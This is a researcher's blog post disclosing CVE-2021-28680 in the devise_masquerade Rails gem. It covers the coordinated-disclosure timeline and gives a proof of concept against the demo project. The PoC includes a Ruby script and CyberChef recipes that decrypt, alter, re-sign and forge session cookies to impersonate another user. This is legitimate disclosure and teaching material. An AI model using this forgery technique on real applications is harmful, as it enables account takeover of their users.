---
title: "The Devise Extension That Peeled off One Layer of the Security Onion (CVE-2021-28680)"
author: Laban Sköllermark ([@LabanSkoller](https://twitter.com/LabanSkoller))
date: 2021-03-23T21:35:00+01:00
toc: true
tags:
  - Web Vulnerabilities
  - Coordinated Disclosure
  - CVE
featured_image: blog/images/devise_masquerade_dreamstime_27402026.jpg
images:
  - blog/images/devise_masquerade_dreamstime_27402026.jpg
---
I work for the security consultant company
[Defensify](https://defensify.se/home) where I conduct security assessments of
applications and networks. In December 2020 I made a review of a web
application written in [Ruby on Rails](https://rubyonrails.org/). I will not
disclose the name of the client or any other vulnerabilities found in the
client’s application, but this blog post tells the story of how I found a
security vulnerability in one of the third-party dependencies they use, which
is open source, and got my first ever CVE assigned. \o/
<!--more-->

# Timeline

<table>
  <tr>
    <th align="left" width="150px">Date</th>
    <th align="left">Event</th>
  </tr>
  <tr>
    <td valign="top">2020-DEC-16</td>
    <td>The problem was found during a security assessment for my employer <a
href="https://defensify.se/home">Defensify</a></td>
  </tr>
  <tr>
    <td valign="top">2020-DEC-23</td>
    <td>Report sent to the <tt>devise_masquerade</tt> maintainer and as FYI to
the appointed Devise email address for security vulnerabilities. A 90-day
coordinated disclosure deadline was proposed and the intention to publish this
blog post was communicated.</td>
  </tr>
  <tr>
    <td valign="top">2020-DEC-23</td>
    <td>Reception of report confirmed by the <tt>devise_masquerade</tt>
maintainer</td>
  </tr>
  <tr>
    <td valign="top">2021-JAN-08</td>
    <td>Maintainer acknowledged the issue as non-critical and suggested an
alternative fix</td>
  </tr>
  <tr>
    <td valign="top">2021-JAN-11</td>
    <td>No reply at all from the Devise security email address so <a
href="https://github.com/heartcombo/devise/issues/5329">an issue</a> was opened
on GitHub and it turned out the email address was no longer in use. A new email
address was provided to which the original report was sent.</td>
  </tr>
  <tr>
    <td valign="top">2021-JAN-17</td>
    <td>Devise maintainer confirmed the reception of the report, acknowledged
that "it does look like a security concern" and provided some
recommendations</td>
  </tr>
  <tr>
    <td valign="top">2021-FEB-03</td>
    <td>The <tt>devise_masquerade</tt> maintainer bumped the version to 1.3.0
and fixed the issue (<a
href="https://github.com/oivoodoo/devise_masquerade/pull/76">pull request
#76</a>). The fix is included in <a
href="https://github.com/oivoodoo/devise_masquerade/releases/tag/v1.3.1">release
v1.3.1</a>.</td>
  </tr>
  <tr>
    <td valign="top">2021-MAR-17</td>
    <td>Application for a CVE is submitted to Mitre</td>
  </tr>
  <tr>
    <td valign="top">2021-MAR-18</td>
    <td>The CVE Assignment Team at Mitre assigns <a
href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28680">CVE-2021-28680</a>
to the issue</td>
  </tr>
  <tr>
    <td valign="top">2021-MAR-23</td>
    <td>Disclosure deadline met. Public <a
href="https://github.com/oivoodoo/devise_masquerade/issues/83">GitHub issue
#83</a> created. Publication of this post at 21:35 CET.</td>
  </tr>
</table>

# About Security Assessments

A typical web application security assessment at
[Defensify](https://defensify.se/home) is 40 hours with mostly manual tests to
cover [OWASP Top 10](https://owasp.org/www-project-top-ten/) risks and most of
[OWASP Application Security Verification
Standard](https://owasp.org/www-project-application-security-verification-standard/)
(ASVS) 4.0 level 2. It is often conducted by one or two security consultants.
We prefer to have source code available to speed up the assessment and find
more vulnerabilities but that is not always approved by the client.

The output is a written report around 50 pages with usually around 20 security
issues with severities rated *Low*, *Medium*, *High* or *Critical* according to
[NVD CVSS v3](https://nvd.nist.gov/vuln-metrics/cvss), or *Informational* for
hardening tips which do not represent actual vulnerabilities.

# How Devise Session Cookies Work

[Devise](https://github.com/heartcombo/devise/) is a modular Ruby on Rails
authentication solution based on the [Rack](https://github.com/rack/rack)
authentication framework [Warden](https://github.com/wardencommunity/warden).
Session data can be stored in cookies and are then both encrypted and signed.
Keys for the encryption and signing are usually derived from the variable
`secret_key_base` and some static salts using
[PBKDF2](https://en.wikipedia.org/wiki/PBKDF2). The plaintext session data is
either formatted as JSON or serialized using
[Marshal](https://ruby-doc.org/core-3.0.0/Marshal.html).

An example Devise session:

```
{ warden.user.user.key => [[1], "$2a$10$KItas1NKsvunK0O5w9ioWu"] }
```

Much of the security in a Devise application relies on that the value of the
variable `secret_key_base` is kept secret. Only the web server needs to know
it. If it is changed, all existing user sessions will become invalid since the
cookies cannot be neither decrypted nor verified, so users must log in again.

But even if one knows the secret key so that one can encrypt and sign one’s own
session cookies and therefore modify the above data, in most applications one
cannot impersonate users anyway. In the above example session the user’s
password salt is included (see the Stack Overflow question [*What is the warden
data in a Rails/Devise session composed
of?*](https://stackoverflow.com/questions/23597718/what-is-the-warden-data-in-a-rails-devise-session-composed-of/23683925#23683925)).
To know the salt one must have access to the application’s database and without
it the session is not valid. This means that if a user changes their password,
all the other sessions of the user will be invalidated since the salt does not
match anymore.

The fact that an attacker must know a user’s current salt is a security
mechanism and what I refer to as a layer of an application’s security onion. I
found that that layer can be peeled off if the Devise extension
`devise_masquerade` is used.

# Masquerade Functionality Provided by the Extension

The purpose of the `devise_masquerade` extension is to allow administrators of
an application to impersonate users by providing “login as” links in user lists
for example. This is an easy way to see what particular users are seeing, for
troubleshooting purposes for instance.  The masquerade functionality uses some
temporary tokens under the hood which I will not go through here. There are
some visible changes in the client-side session data however which is relevant
for the problem. Examples are taken from the `v1.2.0` tag of
`devise_masquerade`.

A normal non-masqueraded user session could look like this, which is from the
[`devise_masquerade` demo
project](https://github.com/oivoodoo/devise_masquerade/#demo-project)
(prettified for readability):

{{< highlight plain "linenos=false,hl_lines=11" >}}
{
  "session_id" => "644e5c0be8d28a15a88328fa1cbf963f",
  "flash" =>
  {
    "discard" => [],
    "flashes" =>
    {
      "notice" => "Signed in successfully."
    }
  },
  "warden.user.user.key" => [[1], "$2a$10$FEcuUA/KECTwvnjHSRY0oO"],
  "_csrf_token" => "BOg67TylXKT3OX/4NN5RkgBlWjEhKqdxZEvOWEsinTw="
}
{{< /highlight >}}

The user with ID 1 (`user1@example.com` in the demo project) is logged in and
the user’s password is stored as a
[bcrypt](https://en.wikipedia.org/wiki/Bcrypt) hash (`2a`) with cost factor
`10` (2<sup>10</sup> = 1024 rounds) with a 128-bit salt encoded as Base64 to
`FEcuUA/KECTwvnjHSRY0oO`.

When user 1 clicks a link to impersonate user 2 via the `/users/masquerade/2`
endpoint, the salt of that new user is loaded from the database and the session
is changed as follows:

{{< highlight plain "linenos=false,hl_lines=2 11 13-15" >}}
{
  "session_id" => "b9b82f98591a6014a690b0be36b53c7a",
  "flash" => 
  {
    "discard" => [],
    "flashes" =>
    {
      "notice" => "Signed in successfully."
    }
  },
  "warden.user.user.key" => [[2], "$2a$10$BS3Aqkt5g2bOTM6IOgWzWu"],
  "_csrf_token" => "BOg67TylXKT3OX/4NN5RkgBlWjEhKqdxZEvOWEsinTw=",
  "devise_masquerade_user" => 1,
  "devise_masquerade_masquerading_resource_class" => "User",
  "devise_masquerade_masqueraded_resource_class" => "User"
}
{{< /highlight >}}

As you can see, `warden.user.user.key` now says user 2 instead of user 1 and
the salt is replaced with that of user 2. A new session ID is generated. Three
new dictionary entries related to the masquerade extension are also added. The
most relevant one is `devise_masquerade_user` which holds the user ID of the
user who made the impersonation. The reason for that is so that one can “go
back” to the original user, normally an administrator.

That is usually done via the `/users/masquerade/back` endpoint. If one now
clicks that back link, the session is changed again to look like this:

{{< highlight plain "linenos=false,hl_lines=2 11" >}}
{
  "session_id" => "b18884851db9be8d5dbec4b71db8e78d",
  "flash" =>
  {
    "discard" => [],
    "flashes" =>
    {
      "notice" => "Signed in successfully."
    }
  },
  "warden.user.user.key" => [[1], "$2a$10$FEcuUA/KECTwvnjHSRY0oO"],
  "_csrf_token" => "BOg67TylXKT3OX/4NN5RkgBlWjEhKqdxZEvOWEsinTw="
}
{{< /highlight >}}

A new session ID is generated again, the masquerade related items are removed,
and the user ID is reset back to 1 and that user’s salt is loaded from the
database.

Here is a good place to stop and reflect over the masquerade functionality and
what is means for the security assumption described earlier. Can you spot the
issue?

# The devise_masquerade Issue

When the masquerading extension is not present, one must know the password salt
of the target user if one wants to encrypt and sign a valid session cookie.
However, by pretending that a user is already masqueraded, one can decide which
user the “back” action will go back to without knowing that user’s password
salt and simply knowing the user ID!

Let us try to abuse the masquerade functionality to become another user. We
will use the demo project which let us freely move between all (two) users but
let us pretend that user 1 can impersonate user 2 but not vice versa, so our
mission is to become user 1. Note that we use the vulnerable [1.2.0 version of
`devise_masquerade`](https://github.com/oivoodoo/devise_masquerade/releases/tag/v1.2.0).

The `secret_key_base` is generated when the demo project is started and can be
found in `spec/dummy/tmp/development_secret.txt`. The secret for all examples
in this article:

```
37e3fff8f89fb244a6fc9153eae9143dd835e2b9073a7cbe52281e9cb9a014cf3500802f5c02d234197c1ff0ee35e27f6eb87c0964369cb348faa6c7970f6cbb
```

Note that even though all characters in the secret are hexadecimal
(<nobr>`[0-9a-f]`</nobr>), it is [interpreted as a **string** by
OpenSSL](https://github.com/ruby/openssl/blob/b28fb2f05c1e90130b2d4fdcbdae5234b66bbb05/ext/openssl/ossl_kdf.c#L54),
which is [called by the `ActiveSupport::KeyGenerator.generate_key()`
function](https://github.com/rails/rails/blob/447e28347eb46e2ad5dc625de616152bd1b69a32/activesupport/lib/active_support/key_generator.rb#L40).

Below is a Ruby script for decrypting a Rails session cookie, based on [this
gist](https://gist.github.com/mbyczkowski/34fb691b4d7a100c32148705f244d028#file-with_active_support-rb).
With some modification it can alter the decrypted session, re-encrypt and sign
it. Note that I am not a Ruby programmer (I prefer Python).

{{< highlight ruby >}}
require 'cgi'
require 'json'
require 'active_support'

def verify_and_decrypt_session_cookie(cookie, secret_key_base = Rails.application.secrets.secret_key_base)
  cookie = CGI::unescape(cookie)
  salt         = 'encrypted cookie'
  signed_salt  = 'signed encrypted cookie'
  key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000)
  secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len]
  sign_secret = key_generator.generate_key(signed_salt)
  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: Marshal) # or JSON
  session = encryptor.decrypt_and_verify(cookie)
  puts
  puts "Existing session: ", session

  # Modify the session according to your needs here

  #puts "Changed session: ", session
  #new_session = encryptor.encrypt_and_sign(session)
  #puts
  #puts "New encrypted and signed cookie: ", new_session
end

puts "Paste current session cookie: "
cookie = gets.chomp
verify_and_decrypt_session_cookie(cookie, "37e3fff8f89fb244a6fc9153eae9143dd835e2b9073a7cbe52281e9cb9a014cf3500802f5c02d234197c1ff0ee35e27f6eb87c0964369cb348faa6c7970f6cbb")
{{< /highlight >}}

We begin with logging in as user `user2@example.com` with ID 2 and password
`password`.
 
<figure>
  <img src="../../../../images/devise_masquerade_login_user_2.png"
style="display:inline" title="Demo project's login page" alt="Log in --- Email
[user2@example.com] --- Password [********] --- [Log in]">
  <figcaption><i>Logging in as <tt>user2@example.com</tt></i></figcaption>
</figure>

Now we are logged in as user 2:
 
<figure>
  <img src="../../../../images/devise_masquerade_logged_in_as_user_2.png"
style="display:inline" title="Logged in at demo project" alt="user2@example.com
--- user1@example.com [Login as]">
  <figcaption><i>Logged in as <tt>user2@example.com</tt></i></figcaption>
</figure>

The session cookie `_dummy_session` now looks like this:

```
NGE3U09LNmowVnFESHVkRTNuWjByVnBUY1lsL1NsT3hSdCtuMUQyVDFvWmhvYVF6UWFhVFFnNkcybDAxSy9Ob1l0YjVwc0ZMMW9FVENub2NwM2xKTWZvb2c3Mkh3TURiYzlyYTd3WkZLZWMrR1hrZElxcVNmWjlXNThqTWh3R08xZUdQMUlxRmQ2YkRIQmUxODhaNjF2S2ZrN3hNMWxpU3ZqamVFNlR1ZSthSHlISkhiN2VEdTZEc3gwdGQ2WEo4RCtWVHJpbWZKeUs2aHhoVDdKNjhMUS95THRBS3VwYXBRRERXK1VPTGpxRTdtZW50aExsaElnZUpkTXZDR0Jock1oWStEdUxCa0M0OTlRamxnZ1k4YjhZVWl2KytGVTMrbkJjK3FPekVKUTkzRytnVXVQYzZMMTRFR00vZTZncFVnUzVCOGt0a2h1OW9wL0dSNlhsZzVQYVFjcFZWMEViYUFmWUVWZWg5ZWtCUnYwSEllMEFPU1RiRmVZZVlGWlpMK2tkRUV2VzU4RnRDUmxNVzg3OEVsZz09LS1xcTJYRG5wQXpzS29BNU4yd1hkUzdRPT0%3D--617328b58496bb8eb46f85029f0879ae367e3dc8
```

It can be decrypted using the script above:

```
$ ruby recrypt_and_sign_cookie.rb 
Paste current session cookie: 
NGE3U09LNmowVnFESHVkRTNuWjByVnBUY1lsL1NsT3hSdCtuMUQyVDFvWmhvYVF6UWFhVFFnNkcybDAxSy9Ob1l0YjVwc0ZMMW9FVENub2NwM2xKTWZvb2c3Mkh3TURiYzlyYTd3WkZLZWMrR1hrZElxcVNmWjlXNThqTWh3R08xZUdQMUlxRmQ2YkRIQmUxODhaNjF2S2ZrN3hNMWxpU3ZqamVFNlR1ZSthSHlISkhiN2VEdTZEc3gwdGQ2WEo4RCtWVHJpbWZKeUs2aHhoVDdKNjhMUS95THRBS3VwYXBRRERXK1VPTGpxRTdtZW50aExsaElnZUpkTXZDR0Jock1oWStEdUxCa0M0OTlRamxnZ1k4YjhZVWl2KytGVTMrbkJjK3FPekVKUTkzRytnVXVQYzZMMTRFR00vZTZncFVnUzVCOGt0a2h1OW9wL0dSNlhsZzVQYVFjcFZWMEViYUFmWUVWZWg5ZWtCUnYwSEllMEFPU1RiRmVZZVlGWlpMK2tkRUV2VzU4RnRDUmxNVzg3OEVsZz09LS1xcTJYRG5wQXpzS29BNU4yd1hkUzdRPT0%3D--617328b58496bb8eb46f85029f0879ae367e3dc8

Existing session: 
{"session_id"=>"3e446e68d0ea61a10dc403fda69d0e37", "flash"=>{"discard"=>[], "flashes"=>{"notice"=>"Signed in successfully."}}, "warden.user.user.key"=>[[2], "$2a$10$BS3Aqkt5g2bOTM6IOgWzWu"], "_csrf_token"=>"uB1Jk0WwDmT/bCx1ag4j6qzMPenwlHsFhx1XnQRYwL0="}
```

The cookie can also be decrypted using
[CyberChef](https://gchq.github.io/CyberChef/). Here are recipes for [deriving
the 256-bit encryption
key](https://gchq.github.io/CyberChef/#recipe=Derive_PBKDF2_key(%7B'option':'UTF8','string':'37e3fff8f89fb244a6fc9153eae9143dd835e2b9073a7cbe52281e9cb9a014cf3500802f5c02d234197c1ff0ee35e27f6eb87c0964369cb348faa6c7970f6cbb'%7D,256,1000,'SHA1',%7B'option':'UTF8','string':'encrypted%20cookie'%7D))
and for [deriving the 512-bit HMAC (signature)
key](https://gchq.github.io/CyberChef/#recipe=Derive_PBKDF2_key(%7B'option':'UTF8','string':'37e3fff8f89fb244a6fc9153eae9143dd835e2b9073a7cbe52281e9cb9a014cf3500802f5c02d234197c1ff0ee35e27f6eb87c0964369cb348faa6c7970f6cbb'%7D,512,1000,'SHA1',%7B'option':'UTF8','string':'signed%20encrypted%20cookie'%7D))
given a `secret_key_base` string used as passphrase.

The hex data after `--` in the cookie is the HMAC-SHA-1 signature. Here is a
[recipe for verifying the
signature](https://gchq.github.io/CyberChef/#recipe=URL_Decode()HMAC(%7B'option':'Hex','string':'eb7cb6c6e874a11aa2525cc573ccb6521619a1a40ca99b4152ade7fcefd1a13234cf837cfe412115f9eada0090ced9e7bab6987835943d50b838080511c8a424'%7D,'SHA1')&input=TkdFM1UwOUxObW93Vm5GRVNIVmtSVE51V2pCeVZuQlVZMWxzTDFOc1QzaFNkQ3R1TVVReVZERnZXbWh2WVZGNlVXRmhWRkZuTmtjeWJEQXhTeTlPYjFsMFlqVndjMFpNTVc5RlZFTnViMk53TTJ4S1RXWnZiMmMzTWtoM1RVUmlZemx5WVRkM1drWkxaV01yUjFoclpFbHhjVk5tV2psWE5UaHFUV2gzUjA4eFpVZFFNVWx4Um1RMllrUklRbVV4T0RoYU5qRjJTMlpyTjNoTk1XeHBVM1pxYW1WRk5sUjFaU3RoU0hsSVNraGlOMlZFZFRaRWMzZ3dkR1EyV0VvNFJDdFdWSEpwYldaS2VVczJhSGhvVkRkS05qaE1VUzk1VEhSQlMzVndZWEJSUkVSWEsxVlBUR3B4UlRkdFpXNTBhRXhzYUVsblpVcGtUWFpEUjBKb2NrMW9XU3RFZFV4Q2EwTTBPVGxSYW14bloxazRZamhaVldsMkt5dEdWVE1yYmtKakszRlBla1ZLVVRrelJ5dG5WWFZRWXpaTU1UUkZSMDB2WlRabmNGVm5VelZDT0d0MGEyaDFPVzl3TDBkU05saHNaelZRWVZGamNGWldNRVZpWVVGbVdVVldaV2c1Wld0Q1VuWXdTRWxsTUVGUFUxUmlSbVZaWlZsR1dscE1LMnRrUlVWMlZ6VTRSblJEVW14TlZ6ZzNPRVZzWnowOUxTMXhjVEpZUkc1d1FYcHpTMjlCTlU0eWQxaGtVemRSUFQwJTNE).
The data before the signature is Base64 and then URL encoded. Here is a [recipe
for
decoding](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',false)&input=TkdFM1UwOUxObW93Vm5GRVNIVmtSVE51V2pCeVZuQlVZMWxzTDFOc1QzaFNkQ3R1TVVReVZERnZXbWh2WVZGNlVXRmhWRkZuTmtjeWJEQXhTeTlPYjFsMFlqVndjMFpNTVc5RlZFTnViMk53TTJ4S1RXWnZiMmMzTWtoM1RVUmlZemx5WVRkM1drWkxaV01yUjFoclpFbHhjVk5tV2psWE5UaHFUV2gzUjA4eFpVZFFNVWx4Um1RMllrUklRbVV4T0RoYU5qRjJTMlpyTjNoTk1XeHBVM1pxYW1WRk5sUjFaU3RoU0hsSVNraGlOMlZFZFRaRWMzZ3dkR1EyV0VvNFJDdFdWSEpwYldaS2VVczJhSGhvVkRkS05qaE1VUzk1VEhSQlMzVndZWEJSUkVSWEsxVlBUR3B4UlRkdFpXNTBhRXhzYUVsblpVcGtUWFpEUjBKb2NrMW9XU3RFZFV4Q2EwTTBPVGxSYW14bloxazRZamhaVldsMkt5dEdWVE1yYmtKakszRlBla1ZLVVRrelJ5dG5WWFZRWXpaTU1UUkZSMDB2WlRabmNGVm5VelZDT0d0MGEyaDFPVzl3TDBkU05saHNaelZRWVZGamNGWldNRVZpWVVGbVdVVldaV2c1Wld0Q1VuWXdTRWxsTUVGUFUxUmlSbVZaWlZsR1dscE1LMnRrUlVWMlZ6VTRSblJEVW14TlZ6ZzNPRVZzWnowOUxTMXhjVEpZUkc1d1FYcHpTMjlCTlU0eWQxaGtVemRSUFQwJTNE).
Out comes:

```
4a7SOK6j0VqDHudE3nZ0rVpTcYl/SlOxRt+n1D2T1oZhoaQzQaaTQg6G2l01K/NoYtb5psFL1oETCnocp3lJMfoog72HwMDbc9ra7wZFKec+GXkdIqqSfZ9W58jMhwGO1eGP1IqFd6bDHBe188Z61vKfk7xM1liSvjjeE6Tue+aHyHJHb7eDu6Dsx0td6XJ8D+VTrimfJyK6hxhT7J68LQ/yLtAKupapQDDW+UOLjqE7menthLlhIgeJdMvCGBhrMhY+DuLBkC499QjlggY8b8YUiv++FU3+nBc+qOzEJQ93G+gUuPc6L14EGM/e6gpUgS5B8ktkhu9op/GR6Xlg5PaQcpVV0EbaAfYEVeh9ekBRv0HIe0AOSTbFeYeYFZZL+kdEEvW58FtCRlMW878Elg==--qq2XDnpAzsKoA5N2wXdS7Q==
```

This is two Base64 encoded pieces, again separated by `--`. The first piece is
the AES-256-CBC encrypted data and the second piece is the 128-bit IV for the
AES-CBC algorithm.

Here is a [recipe for decrypting the
data](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',false)AES_Decrypt(%7B'option':'Hex','string':'02b2194fde87bd13567d0cb1fefb164ba6ea49e84ad6293984f8895a02377228'%7D,%7B'option':'Base64','string':'/GTxMT%2BFg7kLhDGlNsMXUQ%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)To_Hexdump(16,false,true,false)&input=ei9iME9nOUg0aDNxM2lWNXJoZjRpRkVlZ1FYczhaNWsxd2VZSDMzbHZpcWhudm1hTXpUbnh6VDBtSGt2VXZPSmppemE3bm84S2xGVXVadlg3aXhZUEJMZEwrcjJPUVlUQzFlaWxBL3F3N0pVSHFuMVN0ZUthU3NzRnpDTld0S2ZFY1hpZXNlY05JZHRpd3YreEZNSSt6T1RPbnRRME44UXdVSTBoT0dyaUdWZEhwY0RMaHZ4MFZYT2IwNHZIVFVSc0Y5SDRaNjdkSnpzR3Buc3gyTGoxdkJBbUdzbHoyZE00WkFSNnFaK0RHbGlDaVVsMFk3UWw0ZWpzWFRBc2IzS3R5NWI3TTRDeFg3QXBoVTM4cmVwV1RyanhnQmExcm1jZG1KSmIzQjVvYnRsMU1NU25xL3Y0UVd3azJpemxKMmJ3SURaWjRlbjFSWkNnWEhGRzNlcGhoSGJ2ZUd3TlZGMDBXc09SVUgyeDlRTTZNSFl4RUFsUUdxc1RRR3BsbFpZcHBLMU9QYm5zdFdsZ1RyY2h5N2N3MDJIUnk3MVc1RHZGLzRSQ1RiNHNXU1doTDBxN2lQdXdyaGxOamZMNDBCQUpYVWVqVjB5OUpUakZYUEZOTzIvSWxTckxHTzJuZTRzd2laa0R3ODRxWW5wRGF4S1hwbE5ma0IwQnIrdWtCcWJkWEFPOWhCdjVpcmtvU2hRVXpBdUpZQm1LRThQdzBnN0grUEp3ZU84Yk94RW11ODhVRlpnczdNUGZ6Mkd5V0JiMlk2VjB5RFhocmZwaDhEWWFDWWlCZz09).
The output is a Marshal encoded Ruby object, here represented as a hex dump:

```
00000000  04 08 7b 0c 49 22 0f 73 65 73 73 69 6f 6e 5f 69  |..{.I".session_i|
00000010  64 06 3a 06 45 54 49 22 25 62 39 62 38 32 66 39  |d.:.ETI"%b9b82f9|
00000020  38 35 39 31 61 36 30 31 34 61 36 39 30 62 30 62  |8591a6014a690b0b|
00000030  65 33 36 62 35 33 63 37 61 06 3b 00 54 49 22 0a  |e36b53c7a.;.TI".|
00000040  66 6c 61 73 68 06 3b 00 54 7b 07 49 22 0c 64 69  |flash.;.T{.I".di|
00000050  73 63 61 72 64 06 3b 00 54 5b 00 49 22 0c 66 6c  |scard.;.T[.I".fl|
00000060  61 73 68 65 73 06 3b 00 54 7b 06 49 22 0b 6e 6f  |ashes.;.T{.I".no|
00000070  74 69 63 65 06 3b 00 46 49 22 1c 53 69 67 6e 65  |tice.;.FI".Signe|
00000080  64 20 69 6e 20 73 75 63 63 65 73 73 66 75 6c 6c  |d in successfull|
00000090  79 2e 06 3b 00 54 49 22 19 77 61 72 64 65 6e 2e  |y..;.TI".warden.|
000000a0  75 73 65 72 2e 75 73 65 72 2e 6b 65 79 06 3b 00  |user.user.key.;.|
000000b0  54 5b 07 5b 06 69 07 49 22 22 24 32 61 24 31 30  |T[.[.i.I""$2a$10|
000000c0  24 42 53 33 41 71 6b 74 35 67 32 62 4f 54 4d 36  |$BS3Aqkt5g2bOTM6|
000000d0  49 4f 67 57 7a 57 75 06 3b 00 54 49 22 10 5f 63  |IOgWzWu.;.TI"._c|
000000e0  73 72 66 5f 74 6f 6b 65 6e 06 3b 00 46 49 22 31  |srf_token.;.FI"1|
000000f0  42 4f 67 36 37 54 79 6c 58 4b 54 33 4f 58 2f 34  |BOg67TylXKT3OX/4|
00000100  4e 4e 35 52 6b 67 42 6c 57 6a 45 68 4b 71 64 78  |NN5RkgBlWjEhKqdx|
00000110  5a 45 76 4f 57 45 73 69 6e 54 77 3d 06 3b 00 46  |ZEvOWEsinTw=.;.F|
00000120  49 22 1b 64 65 76 69 73 65 5f 6d 61 73 71 75 65  |I".devise_masque|
00000130  72 61 64 65 5f 75 73 65 72 06 3b 00 46 69 06 49  |rade_user.;.Fi.I|
00000140  22 32 64 65 76 69 73 65 5f 6d 61 73 71 75 65 72  |"2devise_masquer|
00000150  61 64 65 5f 6d 61 73 71 75 65 72 61 64 69 6e 67  |ade_masquerading|
00000160  5f 72 65 73 6f 75 72 63 65 5f 63 6c 61 73 73 06  |_resource_class.|
00000170  3b 00 54 49 22 09 55 73 65 72 06 3b 00 46 49 22  |;.TI".User.;.FI"|
00000180  31 64 65 76 69 73 65 5f 6d 61 73 71 75 65 72 61  |1devise_masquera|
00000190  64 65 5f 6d 61 73 71 75 65 72 61 64 65 64 5f 72  |de_masqueraded_r|
000001a0  65 73 6f 75 72 63 65 5f 63 6c 61 73 73 06 3b 00  |esource_class.;.|
000001b0  54 40 18                                         |T@.|
000001b3
```

Now back to the proof-of-concept.

Let us now add the following line to the Ruby script to fool
`devise_masquerade` that we have become user 2 by logging in as user 1 and
using the masquerade functionality:

{{< highlight ruby >}}
  session["devise_masquerade_user"] = 1
{{< /highlight >}}

Rerunning the script will now give us a new cookie:

```
$ ruby recrypt_and_sign_cookie.rb 
Paste current session cookie: 
NGE3U09LNmowVnFESHVkRTNuWjByVnBUY1lsL1NsT3hSdCtuMUQyVDFvWmhvYVF6UWFhVFFnNkcybDAxSy9Ob1l0YjVwc0ZMMW9FVENub2NwM2xKTWZvb2c3Mkh3TURiYzlyYTd3WkZLZWMrR1hrZElxcVNmWjlXNThqTWh3R08xZUdQMUlxRmQ2YkRIQmUxODhaNjF2S2ZrN3hNMWxpU3ZqamVFNlR1ZSthSHlISkhiN2VEdTZEc3gwdGQ2WEo4RCtWVHJpbWZKeUs2aHhoVDdKNjhMUS95THRBS3VwYXBRRERXK1VPTGpxRTdtZW50aExsaElnZUpkTXZDR0Jock1oWStEdUxCa0M0OTlRamxnZ1k4YjhZVWl2KytGVTMrbkJjK3FPekVKUTkzRytnVXVQYzZMMTRFR00vZTZncFVnUzVCOGt0a2h1OW9wL0dSNlhsZzVQYVFjcFZWMEViYUFmWUVWZWg5ZWtCUnYwSEllMEFPU1RiRmVZZVlGWlpMK2tkRUV2VzU4RnRDUmxNVzg3OEVsZz09LS1xcTJYRG5wQXpzS29BNU4yd1hkUzdRPT0%3D--617328b58496bb8eb46f85029f0879ae367e3dc8

Existing session: 
{"session_id"=>"3e446e68d0ea61a10dc403fda69d0e37", "flash"=>{"discard"=>[], "flashes"=>{"notice"=>"Signed in successfully."}}, "warden.user.user.key"=>[[2], "$2a$10$BS3Aqkt5g2bOTM6IOgWzWu"], "_csrf_token"=>"uB1Jk0WwDmT/bCx1ag4j6qzMPenwlHsFhx1XnQRYwL0="}
Changed session: 
{"session_id"=>"3e446e68d0ea61a10dc403fda69d0e37", "flash"=>{"discard"=>[], "flashes"=>{"notice"=>"Signed in successfully."}}, "warden.user.user.key"=>[[2], "$2a$10$BS3Aqkt5g2bOTM6IOgWzWu"], "_csrf_token"=>"uB1Jk0WwDmT/bCx1ag4j6qzMPenwlHsFhx1XnQRYwL0=", "devise_masquerade_user"=>1}

New encrypted and signed cookie: 
aWx1bzZaVDBSY3JabC9KcE5lNG50d0ZvUFFKRnRObW93d3FybFA5SHE3YUNXK1BHNzRrdkZaajd3YVQ1K0FFZ3Z4YXFzMVhaYnZWWHR6ZmpFVVZVS3NLQjlIMTF1OXFlWjRiaGZmVzhuTmhiV1VmaitXdllyekRVMFVpWmJ4MUo1cTRPK0hsdHpHb2hhRFdSTjdTanRUSDYzdkNLMm5VRGhWTTFMQW4vTUJwSHpGRjVON1lwN3ppSU51TW1pV2c3R0UrWWg4aFVFMTNXQnRxZzBkbEQ4WENRMG9Ha2l5UitRaHhXR1ZnTUZ5TXNPSzRTZTFoM3QwVGlGMCsvMjhvVlIza0M2dzM5enVxYmZEMlZJRFFOSm1oVE1SVUxKenZxOCttUmR2cHd6cDZYUCswalEvb2dHMUNCZVRaTTh2YXk5MTJIOVBET09takdob1AwSWpJUW9sMHgyeHpaVnVjMHdFeVRiRW9ud040Y2hKYkgxR0trdlJ1Ynl0TGMvM21HVkNPaDd5SDdoaStJNHAzc3RHazlWSEVFbG4vNHJTY3NnWS9ta3lKOURzST0tLWUwaEJ6NHpRRzBNS0RTWGViNmR6Smc9PQ==--b802b1059b17e824785e5c30d5d93080b1f8c3aa
```

Using this new cookie value in the browser and reloading the page shows that
the application now thinks we have really done a masquerade. A *Back
masquerade* link is now available.
 
<figure>
  <img src="../../../../images/devise_masquerade_fake_masquerade.png"
style="display:inline" title="Masqueraded user 2 in demo project"
alt="user2@example.com --- [Back masquerade] --- user1@example.com [Login as]">
  <figcaption><i>Fakely masqueraded as <tt>user2@example.com</tt></i></figcaption>
</figure>

Clicking that back link is the final step.

<figure>
  <img src="../../../../images/devise_masquerade_masquerade_back.png"
style="display:inline" title="Becoming user 1 in demo project"
alt="user1@example.com --- user2@example.com [Login as]">
  <figcaption><i>Become <tt>user1@example.com</tt> using the
vulnerability</i></figcaption>
</figure>

We just became user 1 without knowing their password or salt!

<figure>
  <img src="../../../../images/devise_masquerade_hello_my_name_is_admin.svg"
style="display:inline" title="HELLO MY NAME IS... admin">
</figure>

Here is the new session cookie we got:

```
$ ruby recrypt_and_sign_cookie.rb 
Paste current session cookie: 
